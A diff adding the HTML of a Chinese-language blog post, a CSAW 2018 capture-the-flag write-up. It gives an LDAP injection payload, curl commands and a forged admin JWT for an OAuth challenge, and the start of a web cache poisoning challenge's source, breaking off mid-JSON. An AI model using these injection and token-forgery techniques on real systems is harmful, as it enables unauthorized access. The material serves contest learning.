@@ -1,0 +1,1756 @@
+<!DOCTYPE html>
+<html>
+    <!-- title -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="Tianji">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Tianji">
+    <meta name="keywords" content="casw-2018 | Tianji">
+    <meta name="description" content="">
+    <meta name="Cache-Control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>casw-2018 · Tianji&#39;s Blog</title>
+    <!-- 设置密码 -->
+    <script>
+        (function(){
+            if(''){
+                if (prompt('请输入文章密码','') !== ''){
+                    alert('密码错误！');
+                    history.back();
+                }
+            }
+        })();
+    </script>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s 1;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180721" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180721" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin="">
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin="">
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">Tianji&#39;s Blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">casw-2018</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href="/">Tianji's Blog.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="height:50vh;">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            casw-2018
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count">2,998</span> / Reading time: <span class="post-count">17 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/09/18</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;">
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ldab"><a href="#ldab" class="headerlink" title="ldab"></a>ldab</h2><p>ldap注入</p>
+<p>参考链接:</p>
+<ul>
+<li><a href="https://www.cnblogs.com/r00tgrok/p/LDAP_INJECTION_AND_PREVENTION.html" rel="external nofollow" target="_blank">https://www.cnblogs.com/r00tgrok/p/LDAP_INJECTION_AND_PREVENTION.html</a></li>
+<li><a href="http://www.4hou.com/technology/9090.html" rel="external nofollow" target="_blank">http://www.4hou.com/technology/9090.html</a></li>
+</ul>
+<p>正常语法：</p>
+<p><code>(&amp;(cn=s*)(|(sn=d*)(sn=r*))</code></p>
+<p>payload:<code>*)(|(ou=*</code></p>
+<h2 id="SSO"><a href="#SSO" class="headerlink" title="SSO"></a>SSO</h2><p>首先获取<code>auth code</code>:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cl_id=1</span><br><span class="line">echo "POST http://web.chal.csaw.io:9000/oauth2/authorize"</span><br><span class="line">auth_key=$(curl --silent 2&gt;&amp;1 -X POST  http://web.chal.csaw.io:9000/oauth2/authorize --data "response_type=code&amp;client_id=$&#123;cl_id&#125;&amp;redirect_uri=http://web.chal.csaw.io:9000/oauth2/token&amp;state=123" | awk -v FS="code=|&amp;amp;state" '&#123;print $2&#125;')</span><br><span class="line">echo "Getting Authorization Code : $&#123;auth_key&#125;"</span><br></pre></td></tr></table></figure>
+<p>通过<code>auth code</code>获取<code>token</code>:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo "POST http://web.chal.csaw.io:9000/oauth2/token (using this Authorization Code"</span><br><span class="line">token=$(curl --silent 2&gt;&amp;1 -X POST  http://web.chal.csaw.io:9000/oauth2/token --data "grant_type=authorization_code&amp;code=$&#123;auth_key&#125;&amp;client_id=$&#123;cl_id&#125;&amp;redirect_uri=http://web.chal.csaw.io:9000/oauth2/token")</span><br><span class="line">echo "Getting Json Response : $&#123;token&#125;"</span><br></pre></td></tr></table></figure>
+<p>得到<code>token</code>，通过<code>jwt.io</code>解密,然后将<code>type</code>修改为<code>admin</code>,密码设置为<code>ufoundme!</code>:</p>
+<p><img src="/home/tianji/Desktop/TIM截图20180918172748.png" alt=""></p>
+<blockquote>
+<p>s}ht@DESKTOP-GUA7PSI:/mnt/d/Program Files/cmder_mini$ curl  <a href="http://web.chal.csaw.io:9000/protected" rel="external nofollow" target="_blank">http://web.chal.csaw.io:9000/protected</a> -H “Authorization: Bearer JhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWRtaW4iLCJzZWNyZXQiOiJ1Zm91bmRtZSEiLCJpYXQiOjE1MzcyNjI3NjYsImV4cCI6MTUzNzI2MzM2Nn0.VNm-jOfhxfza8W8RpC7sr-zUDPtXBdfI4XkT1CCdS34” | grep -Eo “flag{.*}”</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;JsonWebTokensaretheeasieststorage-lessdataoptiononthemarket!theyrelyonsupersecureblockchainlevelencryptionfortheirmethods&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="Hacker-Movies-Club"><a href="#Hacker-Movies-Club" class="headerlink" title="Hacker Movies Club"></a>Hacker Movies Club</h2><p>web缓存污染攻击:<a href="https://portswigger.net/blog/practical-web-cache-poisoning" rel="external nofollow" target="_blank">https://portswigger.net/blog/practical-web-cache-poisoning</a></p>
+<p>index.html:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">data-src</span>=<span class="string">"mustache.min.js"</span> <span class="attr">data-cdn</span>=<span class="string">"71aabdeb3d708872c6e00e066ae48b2669834df7.hm.vulnerable.services"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">data-src</span>=<span class="string">"app.js"</span> <span class="attr">data-cdn</span>=<span class="string">"71aabdeb3d708872c6e00e066ae48b2669834df7.hm.vulnerable.services"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"content"</span>&gt;</span>Loading..<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">window.loaded_recapcha = () =&gt; &#123;</span></span><br><span class="line"><span class="undefined">    window.loaded_recapcha = true;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">window.loaded_mustache = () =&gt; &#123;</span></span><br><span class="line"><span class="undefined">    window.loaded_mustache = true;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"/cdn.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'https://www.google.com/recaptcha/api.js?onload=loaded_recapcha&amp;render=explicit'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>CDN.js, 加载头部的js:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> t <span class="keyword">of</span> <span class="built_in">document</span>.head.children) &#123;</span><br><span class="line">    <span class="keyword">if</span> (t.tagName !== <span class="string">'SCRIPT'</span>)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">let</span> &#123; cdn, src &#125; = t.dataset;</span><br><span class="line">    <span class="keyword">if</span> (cdn === <span class="literal">undefined</span> || src === <span class="literal">undefined</span>)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    fetch(<span class="string">`//<span class="subst">$&#123;cdn&#125;</span>/cdn/<span class="subst">$&#123;src&#125;</span>`</span>,&#123;</span><br><span class="line">        headers: &#123;</span><br><span class="line">            <span class="string">'X-Forwarded-Host'</span>:cdn</span><br><span class="line">        &#125;&#125;</span><br><span class="line">    ).then(<span class="function"><span class="params">r</span>=&gt;</span>r.blob()).then(<span class="function"><span class="params">b</span>=&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> u = URL.createObjectURL(b);</span><br><span class="line">        <span class="keyword">let</span> s = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">        s.src = u;</span><br><span class="line">        <span class="built_in">document</span>.head.appendChild(s);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>app.js:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> token = <span class="literal">null</span>;</span><br><span class="line"><span class="built_in">Promise</span>.all([</span><br><span class="line">    fetch(<span class="string">'/api/movies'</span>).then(<span class="function"><span class="params">r</span>=&gt;</span>r.json()),</span><br><span class="line">  fetch(<span class="string">`//71aabdeb3d708872c6e00e066ae48b2669834df7.hm.vulnerable.services/cdn/main.mst`</span>).then(<span class="function"><span class="params">r</span>=&gt;</span>r.text()),</span><br><span class="line">    <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">window</span>.loaded_recapcha === <span class="literal">true</span>)</span><br><span class="line">            <span class="keyword">return</span> resolve();</span><br><span class="line">        <span class="built_in">window</span>.loaded_recapcha = resolve;</span><br><span class="line">    &#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">window</span>.loaded_mustache === <span class="literal">true</span>)</span><br><span class="line">            <span class="keyword">return</span> resolve();</span><br><span class="line">        <span class="built_in">window</span>.loaded_mustache = resolve;</span><br><span class="line">    &#125;)</span><br><span class="line">]).then(<span class="function">(<span class="params">[user, view]</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">'content'</span>).innerHTML = Mustache.render(view,user);</span><br><span class="line"></span><br><span class="line">    grecaptcha.render(<span class="built_in">document</span>.getElementById(<span class="string">"captcha"</span>), &#123;</span><br><span class="line">        sitekey: <span class="string">'6Lc8ymwUAAAAAM7eBFxU1EBMjzrfC5By7HUYUud5'</span>,</span><br><span class="line">        theme: <span class="string">'dark'</span>,</span><br><span class="line">        callback: <span class="function"><span class="params">t</span>=&gt;</span> &#123;</span><br><span class="line">            token = t;</span><br><span class="line">            <span class="built_in">document</span>.getElementById(<span class="string">'report'</span>).disabled = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">let</span> hidden = <span class="literal">true</span>;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">'report'</span>).onclick = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (hidden) &#123;</span><br><span class="line">          <span class="built_in">document</span>.getElementById(<span class="string">"captcha"</span>).parentElement.style.display=<span class="string">'block'</span>;</span><br><span class="line">          <span class="built_in">document</span>.getElementById(<span class="string">'report'</span>).disabled = <span class="literal">true</span>;</span><br><span class="line">          hidden = <span class="literal">false</span>;</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        fetch(<span class="string">'/api/report'</span>,&#123;</span><br><span class="line">            method: <span class="string">'POST'</span>,</span><br><span class="line">            body: <span class="built_in">JSON</span>.stringify(&#123;<span class="attr">token</span>:token&#125;)</span><br><span class="line">        &#125;).then(<span class="function"><span class="params">r</span>=&gt;</span>r.json()).then(<span class="function"><span class="params">j</span>=&gt;</span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (j.success) &#123;</span><br><span class="line">                <span class="comment">// The admin is on her way to check the page</span></span><br><span class="line">                alert(<span class="string">"Neo... nobody has ever done this before."</span>);</span><br><span class="line">                alert(<span class="string">"That's why it's going to work."</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                alert(<span class="string">"Dodge this."</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>main.mst，模板文件:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;header&quot;&gt;</span><br><span class="line">Hacker Movie Club</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&#123;&#123;#admin&#125;&#125;</span><br><span class="line">&lt;div class=&quot;header admin&quot;&gt;</span><br><span class="line">Welcome to the desert of the real.</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&#123;&#123;/admin&#125;&#125;</span><br><span class="line"></span><br><span class="line">&lt;table class=&quot;movies&quot;&gt;</span><br><span class="line">&lt;thead&gt;</span><br><span class="line"> &lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Year&lt;/th&gt;&lt;th&gt;Length&lt;/th&gt;</span><br><span class="line">&lt;/thead&gt;</span><br><span class="line">&lt;tbody&gt;</span><br><span class="line">&#123;&#123;#movies&#125;&#125;</span><br><span class="line">  &#123;&#123;^admin_only&#125;&#125;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">      &lt;td&gt;&#123;&#123; name &#125;&#125;&lt;/td&gt;</span><br><span class="line">      &lt;td&gt;&#123;&#123; year &#125;&#125;&lt;/td&gt;</span><br><span class="line">      &lt;td&gt;&#123;&#123; length &#125;&#125;&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">  &#123;&#123;/admin_only&#125;&#125;</span><br><span class="line">&#123;&#123;/movies&#125;&#125;</span><br><span class="line">&lt;/tbody&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;captcha&quot;&gt;</span><br><span class="line">  &lt;div id=&quot;captcha&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;button id=&quot;report&quot; type=&quot;submit&quot; class=&quot;report&quot;&gt;&lt;/button&gt;</span><br></pre></td></tr></table></figure>
+<p>分析:</p>
+<p>通过查看<code>/api/movies</code>的返回结果可以看到<code>[REDACTED]</code>,只能由管理员查看。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;admin&quot;:false,&quot;movies&quot;:[&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;1 Hour, 54 Minutes&quot;,&quot;name&quot;:&quot;WarGames&quot;,&quot;year&quot;:1983&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;0 Hours, 31 Minutes&quot;,&quot;name&quot;:&quot;Kung Fury&quot;,&quot;year&quot;:2015&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;2 Hours, 6 Minutes&quot;,&quot;name&quot;:&quot;Sneakers&quot;,&quot;year&quot;:1992&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;1 Hour, 39 Minutes&quot;,&quot;name&quot;:&quot;Swordfish&quot;,&quot;year&quot;:2001&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;2 Hours, 6 Minutes&quot;,&quot;name&quot;:&quot;The Karate Kid&quot;,&quot;year&quot;:1984&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;1 Hour, 23 Minutes&quot;,&quot;name&quot;:&quot;Ghost in the Shell&quot;,&quot;year&quot;:1995&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;5 Hours, 16 Minutes&quot;,&quot;name&quot;:&quot;Serial Experiments Lain&quot;,&quot;year&quot;:1998&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;2 Hours, 16 Minutes&quot;,&quot;name&quot;:&quot;The Matrix&quot;,&quot;year&quot;:1999&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;1 Hour, 57 Minutes&quot;,&quot;name&quot;:&quot;Blade Runner&quot;,&quot;year&quot;:1982&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;2 Hours, 43 Minutes&quot;,&quot;name&quot;:&quot;Blade Runner 2049&quot;,&quot;year&quot;:2017&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;1 Hour, 47 Minutes&quot;,&quot;name&quot;:&quot;Hackers&quot;,&quot;year&quot;:1995&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;1 Hour, 36 Minutes&quot;,&quot;name&quot;:&quot;TRON&quot;,&quot;year&quot;:1982&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;2 Hours, 5 Minutes&quot;,&quot;name&quot;:&quot;Tron: 